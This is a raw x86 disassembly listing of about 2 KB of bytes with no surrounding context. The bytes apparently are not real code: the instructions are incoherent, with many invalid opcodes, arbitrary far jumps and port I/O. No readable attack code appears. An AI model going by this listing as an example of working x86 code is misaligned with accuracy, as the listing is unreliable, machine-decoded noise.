  412cb5:	fwait
  412cb6:	inc    edi
  412cb7:	(bad)  
  412cb8:	push   ebx
  412cb9:	fild   WORD PTR [edx-0x38e163e1]
  412cbf:	pop    eax
  412cc0:	fmul   st(0),st
  412cc2:	mov    ebp,DWORD PTR [edx+0x58b2043a]
  412cc8:	bound  ebx,QWORD PTR ss:[edi]
  412ccb:	inc    ecx
  412ccc:	dec    edi
  412ccd:	add    al,0x51
  412ccf:	or     BYTE PTR [edi-0x2a6c69aa],dl
  412cd5:	mov    ecx,0x96495c8c
  412cda:	pop    edx
  412cdb:	cmovnp edi,esp
  412cde:	lea    esi,[edx+0x5ee79881]
  412ce4:	mov    al,ds:0x7b05498a
  412ce9:	add    ecx,DWORD PTR [edx-0x3bb34b0e]
  412cef:	xlat   BYTE PTR ds:[ebx]
  412cf0:	mov    ecx,0x1227d1db
  412cf5:	mov    ds:0x8085f9ce,al
  412cfa:	inc    ecx
  412cfb:	stos   BYTE PTR es:[edi],al
  412cfc:	push   ss
  412cfd:	jmp    0x497afcc2
  412d02:	ins    BYTE PTR es:[edi],dx
  412d03:	sbb    ah,ah
  412d05:	xchg   edi,eax
  412d06:	add    edi,DWORD PTR [eax]
  412d08:	jmp    0x412d28
  412d0a:	push   ebp
  412d0b:	lahf   
  412d0c:	sbb    DWORD PTR [esi-0x1af7f20],ebx
  412d12:	(bad)  [edi]
  412d14:	out    dx,eax
  412d15:	pop    esi
  412d16:	aam    0x45
  412d18:	or     eax,0x8bf90456
  412d1d:	mov    WORD PTR [ebp-0x4d5812f4],?
  412d23:	stc    
  412d24:	push   es
  412d25:	fs pushf 
  412d27:	out    0x1c,eax
  412d29:	pop    eax
  412d2a:	cdq    
  412d2b:	pop    edi
  412d2c:	ins    DWORD PTR es:[edi],dx
  412d2d:	jb     0x412d85
  412d2f:	jge    0x412cd4
  412d31:	repnz neg DWORD PTR [esi]
  412d34:	out    dx,eax
  412d35:	outs   dx,DWORD PTR ds:[esi]
  412d36:	test   BYTE PTR [ebx+0x7a],0x26
  412d3a:	neg    DWORD PTR [edi-0x29]
  412d3d:	pop    edi
  412d3e:	lds    ecx,FWORD PTR ds:[ecx]
  412d41:	pop    eax
  412d42:	sub    BYTE PTR [edi],al
  412d44:	dec    ebx
  412d45:	xor    al,0x7f
  412d47:	push   ebx
  412d48:	pop    eax
  412d49:	mov    edi,DWORD PTR [ebp+0xf701df1]
  412d4f:	inc    edx
  412d50:	push   0x64
  412d52:	ja     0x412d95
  412d54:	xor    eax,0x650fcade
  412d59:	pop    eax
  412d5a:	inc    ch
  412d5c:	add    BYTE PTR [esi],bh
  412d5e:	xchg   ebp,eax
  412d5f:	jp     0x412d41
  412d61:	addr16 ja 0x412dda
  412d64:	dec    dl
  412d66:	cmp    al,0x88
  412d68:	pop    ecx
  412d69:	pop    ebp
  412d6a:	pop    ebx
  412d6b:	mov    edi,0x86659b8a
  412d70:	mov    esi,0x2fc631ee
  412d75:	call   0x56c7:0x387f559e
  412d7c:	add    eax,0x835ee81b
  412d81:	je     0x412d24
  412d83:	mov    edi,0xd6e049a6
  412d88:	push   ds
  412d89:	mov    eax,ds:0x82f30b6a
  412d8e:	pushf  
  412d8f:	push   ds
  412d90:	mov    gs,WORD PTR [ebx]
  412d92:	xor    BYTE PTR [eax+0x3a7ee156],bh
  412d98:	ret    0xccb
  412d9b:	mov    ebp,0xe222687a
  412da0:	pop    ebx
  412da1:	push   es
  412da2:	lods   eax,DWORD PTR ds:[esi]
  412da3:	imul   DWORD PTR [ebp-0x4895c1df]
  412da9:	or     BYTE PTR [eax+0x37],bh
  412dac:	and    ecx,DWORD PTR [ecx]
  412dae:	imul   edi,esi,0x3b
  412db1:	mov    bl,0xdd
  412db3:	cmp    BYTE PTR [ebx-0x48c7e930],0xdd
  412dba:	xchg   esp,eax
  412dbb:	test   al,0x7c
  412dbd:	fwait
  412dbe:	int3   
  412dbf:	outs   dx,BYTE PTR ds:[esi]
  412dc0:	adc    al,0x22
  412dc2:	(bad)  
  412dc3:	push   esp
  412dc4:	mov    BYTE PTR [edi+0x3e],al
  412dc7:	inc    DWORD PTR [ecx+0x12]
  412dca:	cmc    
  412dcb:	sbb    ah,BYTE PTR [ebx-0x70]
  412dce:	ins    DWORD PTR es:[edi],dx
  412dcf:	repz inc esp
  412dd1:	add    bl,dh
  412dd3:	pop    eax
  412dd4:	dec    esp
  412dd5:	mov    ah,0xd
  412dd7:	mov    edi,DWORD PTR ds:0x5ad69244
  412ddd:	std    
  412dde:	gs (bad) 
  412de0:	arpl   WORD PTR [ebp-0x65],si
  412de3:	inc    edi
  412de4:	dec    ebp
  412de5:	pop    ebp
  412de6:	fsub   QWORD PTR [ebx-0x11766902]
  412dec:	jnp    0x412d86
  412dee:	add    eax,0xff93bf92
  412df3:	adc    al,0x42
  412df5:	push   0x410774dc
  412dfa:	(bad)  
  412dfb:	shr    BYTE PTR [ebp-0x59],cl
  412dfe:	fwait
  412dff:	daa    
  412e00:	inc    ebp
  412e01:	adc    BYTE PTR [edi+eax*2],bl
  412e04:	mov    ecx,0xdb402424
  412e09:	pop    ss
  412e0a:	sbb    al,0x51
  412e0c:	enter  0xba4a,0x5f
  412e10:	hlt    
  412e11:	mov    dh,BYTE PTR [ebx+0x28b143c]
  412e17:	xchg   esp,eax
  412e18:	popa   
  412e19:	add    BYTE PTR [edi+0x4db3d34b],ch
  412e1f:	jmp    0xd2df:0xc56df85a
  412e26:	xor    al,0xdf
  412e28:	inc    esi
  412e29:	enter  0xc556,0xf9
  412e2d:	dec    esi
  412e2e:	stos   BYTE PTR es:[edi],al
  412e2f:	fcom   QWORD PTR [ebx+esi*8]
  412e32:	clc    
  412e33:	ja     0x412ea0
  412e35:	push   edx
  412e36:	out    dx,al
  412e37:	and    bl,al
  412e39:	mov    esi,0xba9e142b
  412e3e:	test   BYTE PTR [edi],dl
  412e40:	adc    eax,0xb153b916
  412e45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e46:	es mov ch,0x91
  412e49:	xlat   BYTE PTR ds:[ebx]
  412e4a:	aas    
  412e4b:	sbb    eax,0xbac2dc34
  412e51:	dec    eax
  412e52:	mov    al,bl
  412e54:	int    0x31
  412e56:	je     0x412e1b
  412e58:	push   ds
  412e59:	enter  0x74f6,0xa8
  412e5d:	hlt    
  412e5e:	add    eax,0xee8c8c67
  412e63:	adc    DWORD PTR [ebx],ebx
  412e65:	retf   0x367e
  412e68:	push   ss
  412e69:	push   ss
  412e6a:	sbb    ecx,DWORD PTR ds:0xd5cda9a6
  412e70:	inc    ebp
  412e71:	(bad)  
  412e72:	mov    ah,0x26
  412e74:	inc    esp
  412e75:	xor    ebx,DWORD PTR [ecx+0x6c1cea01]
  412e7b:	cdq    
  412e7c:	pop    ecx
  412e7d:	push   0x224f0b5
  412e82:	jmp    0xbbbe:0xb51417ee
  412e89:	cmp    al,0x6e
  412e8b:	clc    
  412e8c:	add    esp,DWORD PTR [ebx]
  412e8e:	adc    esi,DWORD PTR ds:0xe9da5cb1
  412e94:	stc    
  412e95:	mov    bh,0x15
  412e97:	dec    ebx
  412e98:	mov    eax,0xd87fb19d
  412e9d:	jmp    0x7f08326b
  412ea2:	mov    ebx,0xb2650d5e
  412ea7:	xor    DWORD PTR [eax-0x73aa37dc],esi
  412ead:	push   ds
  412eae:	fild   DWORD PTR [ebx+0x5e]
  412eb1:	inc    edi
  412eb2:	dec    ecx
  412eb3:	jb     0x412f27
  412eb5:	ficomp WORD PTR [ecx+eax*1-0x1c]
  412eb9:	dec    ebx
  412eba:	mov    eax,ds:0xd03c3c99
  412ebf:	std    
  412ec0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ec1:	dec    ebx
  412ec2:	or     al,0x2b
  412ec4:	sub    eax,0x1f242827
  412ec9:	in     eax,0x5d
  412ecb:	rol    BYTE PTR [ebx+0x54],cl
  412ece:	push   ds
  412ecf:	mov    esi,0xef67c87c
  412ed4:	and    DWORD PTR [ebx+0x44],ebx
  412ed7:	popa   
  412ed8:	aas    
  412ed9:	adc    al,0x74
  412edb:	pop    esp
  412edc:	adc    al,0x73
  412ede:	pop    ebx
  412edf:	call   DWORD PTR ds:0xa621c87
  412ee5:	adc    ah,BYTE PTR [ecx+0x1dd6c05f]
  412eeb:	rcl    ebp,1
  412eed:	add    ebp,DWORD PTR [esi-0x52]
  412ef0:	and    bh,cl
  412ef2:	mov    ch,0x7a
  412ef4:	add    edi,ebx
  412ef6:	mov    esp,0x26d39a2e
  412efb:	in     eax,dx
  412efc:	sub    BYTE PTR ds:0x1da29464,0x7d
  412f03:	gs mov dl,0xce
  412f06:	loopne 0x412f68
  412f08:	out    0x5,eax
  412f0a:	fisttp DWORD PTR [edi-0x3f]
  412f0d:	les    edi,FWORD PTR [eax]
  412f0f:	inc    ecx
  412f10:	pop    edi
  412f11:	inc    ebx
  412f12:	adc    dl,dl
  412f14:	cmp    cl,BYTE PTR [edx-0x77]
  412f17:	adc    eax,0xcd7bf8cf
  412f1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f1d:	mov    cl,0x10
  412f1f:	mov    edi,0x6e590c8a
  412f24:	(bad)  
  412f25:	into   
  412f26:	or     bl,dl
  412f28:	in     al,dx
  412f29:	(bad)  
  412f2a:	mov    bh,0x5a
  412f2c:	mov    esp,0xc5935d8b
  412f31:	outs   dx,DWORD PTR ds:[esi]
  412f32:	mov    dh,0x51
  412f34:	in     eax,dx
  412f35:	mov    dl,0x80
  412f37:	hlt    
  412f38:	ss stos BYTE PTR es:[edi],al
  412f3a:	jae    0x412eeb
  412f3c:	shr    BYTE PTR [eax+0x1b],1
  412f3f:	shl    dh,cl
  412f41:	pop    esp
  412f42:	fwait
  412f43:	pop    edi
  412f44:	enter  0xc0c8,0xc7
  412f48:	dec    ebx
  412f49:	je     0x412f58
  412f4b:	add    al,0x50
  412f4d:	inc    ebp
  412f4e:	das    
  412f4f:	loope  0x412fb4
  412f51:	inc    ebx
  412f52:	lods   eax,DWORD PTR ds:[esi]
  412f53:	jmp    0xe628:0x7daed707
  412f5a:	cmp    BYTE PTR [ebx],cl
  412f5c:	xchg   ebx,eax
  412f5d:	fst    QWORD PTR [ecx-0x57]
  412f60:	jno    0x412f48
  412f62:	shl    DWORD PTR [ebx-0x37b62940],0xe5
  412f69:	sbb    si,WORD PTR [esi+ebp*8]
  412f6d:	mov    bl,0x87
  412f6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f70:	aam    0xf8
  412f72:	fld    st(5)
  412f74:	xor    BYTE PTR [esp+ecx*8-0x74],dh
  412f78:	xor    al,0x64
  412f7a:	hlt    
  412f7b:	lds    eax,FWORD PTR [edx]
  412f7d:	das    
  412f7e:	add    DWORD PTR [edx],esp
  412f80:	dec    edx
  412f81:	gs xchg edx,eax
  412f83:	nop
  412f84:	xor    al,0x5b
  412f86:	jno    0x412f2b
  412f88:	fstp   DWORD PTR [edx]
  412f8a:	xchg   bh,bl
  412f8c:	inc    ebp
  412f8d:	mov    esp,0x14d79343
  412f92:	push   esp
  412f93:	test   BYTE PTR [edi],dh
  412f95:	jecxz  0x412f72
  412f97:	jecxz  0x412f8a
  412f99:	cs or  ch,al
  412f9c:	cmp    ah,bh
  412f9e:	jae    0x412fe9
  412fa0:	fbstp  TBYTE PTR [esi+edx*1+0x21e22293]
  412fa7:	popw   ss
  412fa9:	mul    DWORD PTR [eax]
  412fab:	jmp    0x41301f
  412fad:	mov    WORD PTR [eax],es
  412faf:	int3   
  412fb0:	mov    edi,?
  412fb2:	enter  0xa1fe,0xdc
  412fb6:	pop    edi
  412fb7:	jle    0x413027
  412fb9:	mov    esp,0xce7f0abd
  412fbe:	adc    ebp,ecx
  412fc0:	or     al,BYTE PTR [ecx-0x4f]
  412fc3:	in     eax,dx
  412fc4:	mov    ebx,0xc72eda1b
  412fc9:	inc    ebp
  412fca:	sub    DWORD PTR [esi-0x3ea2db4],eax
  412fd0:	push   edi
  412fd1:	cdq    
  412fd2:	xchg   ebp,eax
  412fd3:	cli    
  412fd4:	clc    
  412fd5:	aaa    
  412fd6:	aad    0xaa
  412fd8:	jge    0x413016
  412fda:	loop   0x412fd8
  412fdc:	repz pop ds
  412fde:	mov    eax,0x42e2688c
  412fe3:	fild   QWORD PTR [esi]
  412fe5:	jmp    0x4da134e
  412fea:	scas   eax,DWORD PTR es:[edi]
  412feb:	and    BYTE PTR [eax],ch
  412fed:	cmp    BYTE PTR [edi],bh
  412fef:	arpl   WORD PTR [edi*8+0x5d164f5c],dx
  412ff6:	xchg   edx,eax
  412ff7:	add    dl,0xa1
  412ffa:	rcr    BYTE PTR [edx-0xa],0xb5
  412ffe:	or     edi,DWORD PTR [ebp-0x59077900]
  413004:	sti    
  413005:	int    0x8b
  413007:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  413009:	xor    al,0x4c
  41300b:	hlt    
  41300c:	int    0xc
  41300e:	or     al,0x72
  413010:	or     eax,0x9422eae
  413015:	and    eax,0x6b6bc7fa
  41301a:	jns    0x413073
  41301c:	scas   al,BYTE PTR es:[edi]
  41301d:	into   
  41301e:	shr    ebp,1
  413020:	aaa    
  413021:	xchg   esi,eax
  413022:	popf   
  413023:	jb     0x41306e
  413025:	and    BYTE PTR [edx-0x18],bl
  413028:	lds    ecx,FWORD PTR [bx+0x25]
  41302c:	jmp    0x2a9ba2ab
  413031:	xor    BYTE PTR [ecx+0x41],al
  413034:	pusha  
  413035:	pop    esi
  413036:	sbb    ch,cl
  413038:	pushf  
  413039:	xlat   BYTE PTR ds:[ebx]
  41303a:	test   ah,dh
  41303c:	loope  0x413075
  41303e:	ins    BYTE PTR es:[edi],dx
  41303f:	mov    dl,0xd
  413041:	daa    
  413042:	sbb    ch,BYTE PTR [eax]
  413044:	sbb    esi,DWORD PTR [edx-0x2bbe8d23]
  41304a:	aad    0xa0
  41304c:	dec    eax
  41304d:	inc    eax
  41304e:	adc    eax,0x9f7c42d7
  413053:	ret    0x7083
  413056:	add    ebx,0x4e
  413059:	mov    edx,0x4c4388be
  41305e:	leave  
  41305f:	call   0xaebc90d2
  413064:	pop    ss
  413065:	fst    DWORD PTR [ecx-0x68]
  413068:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413069:	and    esp,DWORD PTR [edx]
  41306b:	mov    cs,WORD PTR [edi-0x55f4f2d2]
  413071:	inc    ebp
  413072:	cmc    
  413073:	ror    BYTE PTR [ebx-0x4260c66c],0xe4
  41307a:	sbb    eax,0xc613e06d
  41307f:	xchg   ebp,eax
  413080:	xchg   edi,eax
  413081:	fs xchg ebp,eax
  413083:	xor    eax,0xfdc7c18
  413088:	ret    0x57a4
  41308b:	and    BYTE PTR [ebx+eax*8+0x7a18b1d3],cl
  413092:	repnz push cs
  413094:	imul   edi,ebx,0x5e
  413097:	shr    DWORD PTR [edi+0x4bcc4e3],1
  41309d:	sbb    al,0xcc
  41309f:	inc    ebx
  4130a0:	jne    0x413102
  4130a2:	imul   ecx,DWORD PTR [ebx],0x6f
  4130a5:	adc    eax,0x487d57ce
  4130aa:	std    
  4130ab:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4130ad:	jbe    0x413125
  4130af:	xchg   DWORD PTR [ebx+0x15bb773c],ebx
  4130b5:	loope  0x413108
  4130b7:	jmp    0x4130d2
  4130b9:	xchg   ebx,eax
  4130ba:	cmp    eax,0xf8461cef
  4130bf:	ret    0x3378
  4130c2:	pop    es
  4130c3:	mov    bh,BYTE PTR [edx-0x25b1137e]
  4130c9:	iret   
  4130ca:	mov    eax,ds:0x7a366443
  4130cf:	sbb    DWORD PTR ds:0x1358861e,edi
  4130d5:	adc    al,0x7c
  4130d7:	jbe    0x4130ae
  4130d9:	ret    
  4130da:	scas   al,BYTE PTR es:[edi]
  4130db:	add    al,0xa5
  4130dd:	and    edx,DWORD PTR [edi-0x67]
  4130e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130e1:	js     0x41308e
  4130e3:	jbe    0x4130d4
  4130e5:	test   ch,bl
  4130e7:	popf   
  4130e8:	fdiv   DWORD PTR [ecx+0x25]
  4130eb:	jge    0x4130f7
  4130ed:	pop    edx
  4130ee:	sbb    BYTE PTR [eax+0x48],ah
  4130f1:	xor    eax,0xe5471cad
  4130f6:	loopne 0x4130bf
  4130f8:	fdiv   DWORD PTR [ebx+0x52]
  4130fb:	jg     0x4130fb
  4130fd:	sbb    BYTE PTR [ebx],0x99
  413100:	or     dl,ch
  413102:	mov    dl,0x21
  413104:	and    al,0x0
  413106:	mov    WORD PTR [esi+0x63ae62cf],ss
  41310c:	mov    ah,0x10
  41310e:	sub    eax,0xb4e5042e
  413113:	ret    0x50d1
  413116:	lods   eax,DWORD PTR ds:[esi]
  413117:	ins    DWORD PTR es:[edi],dx
  413118:	jmp    0x58e9725c
  41311d:	mov    esp,0xb579f632
  413122:	jae    0x4130fd
  413124:	sbb    bh,bl
  413126:	lods   eax,DWORD PTR ds:[esi]
  413127:	dec    ecx
  413128:	sub    esp,DWORD PTR [eax]
  41312a:	fcmovnu st,st(4)
  41312c:	(bad)  
  41312d:	fnsave [ebx+0x4f]
  413130:	mov    ah,0x21
  413133:	sub    al,0x4e
  413135:	inc    ebp
  413136:	push   ebx
  413137:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413138:	cmp    cl,bh
  41313a:	jbe    0x4130d0
  41313c:	std    
  41313d:	add    BYTE PTR [eax+0x58],al
  413140:	aas    
  413141:	dec    edi
  413142:	lahf   
  413143:	dec    ebx
  413144:	ds clc 
  413146:	arpl   bx,sp
  413148:	sti    
  413149:	or     BYTE PTR [ecx],0x58
  41314c:	inc    esp
  41314d:	loope  0x41312a
  41314f:	lea    ebx,[edx-0xa54145e]
  413155:	xchg   ebp,eax
  413156:	adc    al,0xbb
  413158:	sbb    BYTE PTR [eax+0x3d],dl
  41315b:	int3   
  41315c:	inc    edx
  41315d:	sbb    al,ch
  41315f:	ins    DWORD PTR es:[edi],dx
  413160:	int    0xa5
  413162:	add    al,BYTE PTR [ecx+0x37]
  413165:	jmp    0x370f:0xc358c7d8
  41316c:	add    BYTE PTR [ebx],cl
  41316e:	iret   
  41316f:	repz mov ds:0xc7352aac,eax
  413175:	call   0x90ae98d1
  41317a:	ja     0x4131a6
  41317c:	pusha  
  41317d:	ficom  DWORD PTR [eax+0x71]
  413180:	out    dx,al
  413181:	popf   
  413182:	cmp    BYTE PTR [eax-0x647c3610],0xff
  413189:	das    
  41318a:	aam    0x81
  41318c:	ss lahf 
  41318e:	mov    bl,bl
  413190:	push   edx
  413191:	lahf   
  413192:	fcmovb st,st(1)
  413194:	loopne 0x41316b
  413196:	imul   edx,esi,0xffffff8d
  413199:	dec    esp
  41319a:	and    al,0x83
  41319c:	gs clc 
  41319e:	out    0xe4,al
  4131a0:	stos   DWORD PTR es:[edi],eax
  4131a1:	pop    es
  4131a2:	jno    0x4131d1
  4131a4:	hlt    
  4131a5:	push   0x26ff4485
  4131aa:	in     al,0xc2
  4131ac:	pop    esp
  4131ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131ae:	push   ss
  4131af:	and    al,0xc6
  4131b1:	in     al,dx
  4131b2:	adc    DWORD PTR [ecx+0x1f65ad24],0xffffffe4
  4131b9:	dec    ecx
  4131ba:	mov    ah,0xf8
  4131bc:	shr    BYTE PTR [bx-0x76fc],0xe4
  4131c2:	les    esp,FWORD PTR [ecx+0x48215be5]
  4131c8:	jmp    0x4131ce
  4131ca:	leave  
  4131cb:	out    dx,eax
  4131cc:	dec    ebp
  4131cd:	ins    DWORD PTR es:[edi],dx
  4131ce:	or     eax,ecx
  4131d0:	(bad)  
  4131d1:	push   0x5026ceec
  4131d6:	cli    
  4131d7:	xchg   DWORD PTR ds:0xd15895ac,esp
  4131dd:	and    DWORD PTR [ecx-0x2051875f],0x2c
  4131e4:	xchg   ebx,eax
  4131e5:	add    eax,0x513d79a3
  4131ea:	aaa    
  4131eb:	and    esi,edi
  4131ed:	xchg   ebx,eax
  4131ee:	test   eax,0x986bb9c5
  4131f3:	sub    ecx,DWORD PTR [edi]
  4131f5:	out    0xd1,eax
  4131f7:	hlt    
  4131f8:	sub    eax,0x77442bfb
  4131fd:	mov    WORD PTR [ecx],es
  4131ff:	into   
  413200:	xchg   ecx,esi
  413202:	pusha  
  413203:	push   esp
  413204:	push   esp
  413205:	push   ebp
  413206:	push   esp
  413207:	sbb    eax,0x972c8eb1
  41320c:	sbb    eax,0xc6074679
  413211:	pop    edi
  413212:	or     al,0x2
  413214:	ret    0xea98
  413217:	mov    ch,0xf7
  413219:	shr    esp,cl
  41321b:	push   eax
  41321c:	test   DWORD PTR [ecx+edi*2+0x3483bf8a],ebp
  413223:	loop   0x413255
  413225:	sbb    al,0xdc
  413227:	jg     0x413235
  413229:	shl    ecx,0x21
  41322c:	sbb    edx,DWORD PTR [edx]
  41322e:	mov    bh,dh
  413230:	add    al,0x55
  413232:	xor    DWORD PTR [edx-0x8a942e1],ecx
  413238:	stc    
  413239:	mov    ah,0x4b
  41323b:	and    eax,0x5351be25
  413240:	cmc    
  413241:	mov    ds:0xcf8747ee,eax
  413246:	cmc    
  413247:	psllw  mm3,QWORD PTR [esi+edx*4-0x13cef5d]
  41324f:	arpl   bx,dx
  413251:	mov    dl,0x1e
  413253:	mov    WORD PTR [ebp+0x6120a459],?
  413259:	retf   0x80a0
  41325c:	sub    al,0xda
  41325e:	xor    DWORD PTR [edi+0x3a8accfd],edx
  413264:	iret   
  413265:	mov    esi,0xa0abd509
  41326a:	pop    ecx
  41326b:	ja     0x413255
  41326d:	neg    BYTE PTR [edx+0x66]
  413270:	cmp    edx,eax
  413272:	ins    BYTE PTR es:[edi],dx
  413273:	mov    al,ds:0x65581959
  413278:	push   esi
  413279:	retf   
  41327a:	xchg   BYTE PTR ds:0x12676814,al
  413280:	ja     0x41328b
  413282:	es push ds
  413284:	(bad)  
  413285:	mov    bh,0xd
  413287:	js     0x41327f
  413289:	add    eax,0xa38aae6c
  41328e:	iret   
  41328f:	pop    ecx
  413290:	test   DWORD PTR [ecx-0x776ef4ad],esp
  413296:	push   es
  413297:	inc    ebx
  413298:	push   cs
  413299:	sbb    eax,DWORD PTR [edx]
  41329b:	mov    eax,0x7c3c2a47
  4132a0:	inc    eax
  4132a1:	jmp    0xd182:0x78d160bc
  4132a8:	cli    
  4132a9:	sub    eax,0x9d5c403
  4132ae:	mov    ebp,0x10f9d2ec
  4132b3:	mov    dh,0x2b
  4132b5:	in     al,0x10
  4132b7:	cmp    ebp,DWORD PTR [esi]
  4132b9:	jbe    0x4132da
  4132bb:	nop
  4132bc:	pusha  
  4132bd:	lods   al,BYTE PTR ds:[esi]
  4132be:	out    0x1d,al
  4132c0:	xchg   DWORD PTR [edi+0x6f],ecx
  4132c3:	sub    DWORD PTR [ebx],esp
  4132c5:	mov    esp,0xf06b2ea9
  4132ca:	pop    ecx
  4132cb:	fs call 0xf89cb6ce
  4132d1:	add    edx,eax
  4132d3:	dec    eax
  4132d4:	iret   
  4132d5:	mov    DWORD PTR [eax],ecx
  4132d7:	cmp    ebx,DWORD PTR [eax+0x3e83b4ea]
  4132dd:	mov    bl,0xcf
  4132df:	and    BYTE PTR [ebp+0x26],bh
  4132e2:	mov    edx,0xda954dee
  4132e7:	enter  0xb985,0x58
  4132eb:	mov    edx,0xf05173c5
  4132f0:	mov    eax,0x35387e2d
  4132f5:	fdiv   QWORD PTR [ecx+0xdf9230c]
  4132fb:	jae    0x41335d
  4132fd:	ins    DWORD PTR es:[edi],dx
  4132fe:	adc    DWORD PTR [ebx+0x1140bffe],0xffffff87
  413305:	arpl   dx,bx
  413307:	jl     0x4132a3
  413309:	outs   dx,DWORD PTR ds:[esi]
  41330a:	call   0xe6469cb8
  41330f:	es push edx
  413311:	rcr    DWORD PTR [edi+ebp*2],cl
  413314:	dec    ebp
  413315:	sub    DWORD PTR [ecx],esi
  413317:	sub    eax,DWORD PTR [ebx+0x66]
  41331a:	sbb    eax,edx
  41331c:	inc    edi
  41331d:	je     0x413340
  41331f:	sbb    DWORD PTR [esi-0x36],esi
  413322:	clc    
  413323:	sbb    DWORD PTR [eax+eax*8],esp
  413326:	inc    eax
  413327:	add    dl,BYTE PTR [ecx]
  413329:	imul   DWORD PTR [edx-0x5a225774]
  41332f:	push   ecx
  413330:	push   edi
  413331:	xchg   edx,eax
  413332:	das    
  413333:	ss mov ebp,0xceec63c8
  413339:	lods   al,BYTE PTR ds:[esi]
  41333a:	popa   
  41333b:	js     0x4133b9
  41333d:	fmul   DWORD PTR [ecx]
  41333f:	loopne 0x41332f
  413341:	xchg   ecx,eax
  413342:	mul    DWORD PTR [ecx+0x3789a66]
  413348:	adc    bl,BYTE PTR [edi-0x41]
  41334b:	(bad)  
  41334c:	cmp    bh,BYTE PTR fs:[ebp+ebp*4-0x4e2f3d20]
  413354:	enter  0x6671,0x1
  413358:	mov    WORD PTR [esi+eiz*4],?
  41335b:	ja     0x41330f
  41335d:	call   0xc1e2:0x575c9f75
  413364:	jb     0x413304
  413366:	repnz cs cwde 
  413369:	jp     0x4133c5
  41336b:	jns    0x4133db
  41336d:	cwde   
  41336e:	es ins DWORD PTR es:[edi],dx
  413370:	mov    dh,0xac
  413372:	ins    BYTE PTR es:[edi],dx
  413373:	lahf   
  413374:	sbb    dh,BYTE PTR [edx*1+0x4ee31e60]
  41337b:	loope  0x4133c2
  41337d:	pushf  
  41337e:	out    0xf2,al
  413380:	adc    al,0x1c
  413382:	test   esi,esi
  413384:	pop    ebp
  413385:	or     al,0xbc
  413387:	and    dh,BYTE PTR [esi+0x19ea620c]
  41338d:	adc    DWORD PTR [esi+eiz*8+0x7fed761b],edi
  413394:	and    al,BYTE PTR [esi-0x947f2ba]
  41339a:	sbb    BYTE PTR [edx+0xb6dff0d],dl
  4133a0:	nop
  4133a1:	test   DWORD PTR [ebp-0x1b3b272e],0xa000557e
  4133ab:	or     DWORD PTR [eax-0x4b2a002a],edi
  4133b1:	ds dec esi
  4133b3:	mov    ebx,0x57332f75
  4133b8:	xchg   ecx,eax
  4133b9:	imul   ebx,DWORD PTR [ecx+0x98e1cbe],0x3a0836ab
  4133c3:	pop    ebx
  4133c4:	(bad)  
  4133c5:	aas    
  4133c6:	adc    al,0x3e
  4133c8:	mov    BYTE PTR [ecx+0x4f67b2b1],ch
  4133ce:	sub    ebx,DWORD PTR [edx-0x673caacf]
  4133d4:	pop    ds
  4133d5:	stos   BYTE PTR es:[edi],al
  4133d6:	jp     0x413362
  4133d8:	sub    eax,0x529db049
  4133dd:	cmp    esp,DWORD PTR [ebp-0x5f]
  4133e0:	mov    ds:0xb34f4c14,al
  4133e5:	jp     0x41338f
  4133e7:	retf   
  4133e8:	or     al,BYTE PTR [eax]
  4133ea:	jg     0x413440
  4133ec:	push   ds
  4133ed:	mov    ebx,0x4bdaa177
  4133f2:	mov    ds:0x90ebd236,eax
  4133f7:	xor    al,0x93
  4133f9:	push   ebp
  4133fa:	jns    0x41339a
  4133fc:	cmp    DWORD PTR [edx-0x2d],edx
  4133ff:	aad    0x65
  413401:	mov    ah,0x51
  413403:	inc    edi
  413404:	add    al,0x22
  413406:	cmp    BYTE PTR [ecx+0x2013c392],al
  41340c:	out    0x50,eax
  41340e:	out    dx,al
  41340f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413410:	and    al,0xb3
  413412:	fstp   TBYTE PTR [esi+0x42]
  413415:	mov    ch,BYTE PTR [ebx]
  413417:	lds    ebp,FWORD PTR [ecx-0x6]
  41341a:	sub    eax,0xa2432b59
  41341f:	mov    edx,0x205786c1
  413424:	jmp    0x4133ad
  413426:	rol    ebx,0xbd
  413429:	out    0x91,al
  41342b:	sahf   
  41342c:	jno    0x41348d
  41342e:	jl     0x413465
  413430:	pusha  
  413431:	stc    
  413432:	sub    DWORD PTR [eax+ebx*2+0x3b],eax
  413436:	shr    BYTE PTR [edi+0x1a],cl
  413439:	or     eax,0x45089816
  41343e:	jne    0x4134ac
  413440:	mov    cl,0x99
  413442:	out    0xa0,al
  413444:	pushf  
  413445:	call   0x5a0d:0x45368bd7
  41344c:	ins    BYTE PTR es:[edi],dx
  41344d:	out    0x3e,al
  41344f:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  413451:	mov    cl,ah
  413453:	das    
  413454:	hlt    
  413455:	mov    dl,0xbe
  413457:	xchg   edi,eax
  413458:	jmp    0x4133e6
  41345a:	pop    ebx
  41345b:	sub    eax,0x5772875f
  413460:	and    ecx,DWORD PTR [edi]
  413462:	in     al,0x86
  413464:	scas   eax,DWORD PTR es:[edi]
  413465:	imul   ecx,esp,0xffffffb4
  413468:	(bad)  
  413469:	stc    
  41346a:	xor    eax,0x81bfbd8f
  41346f:	dec    ebp
  413470:	push   ebx
  413471:	mov    fs,ebx
  413473:	jo     0x4134b8
  413475:	inc    ebx
  413476:	scas   eax,DWORD PTR es:[edi]
  413477:	aad    0xe8
  413479:	lock adc ecx,edx
  41347c:	add    BYTE PTR [ecx+0xd3c9204],dh
  413482:	add    eax,0xe3a73dbf
  413487:	adc    ebx,DWORD PTR [ebx+esi*1+0x44]
  41348b:	aaa    
  41348c:	mov    esp,0xe76aa5d9
  413491:	in     eax,0x71
  413493:	out    0x66,eax
  413495:	mov    dh,BYTE PTR [ebp+eiz*8+0x3c97371f]
  41349c:	xor    eax,0xcf7b89c1
  4134a1:	es sahf 
  4134a3:	add    al,0xb6
  4134a5:	and    ah,ch
  4134a7:	cs cmp eax,0xcfd3af76
  4134ad:	shl    dh,1
  4134af:	(bad)  
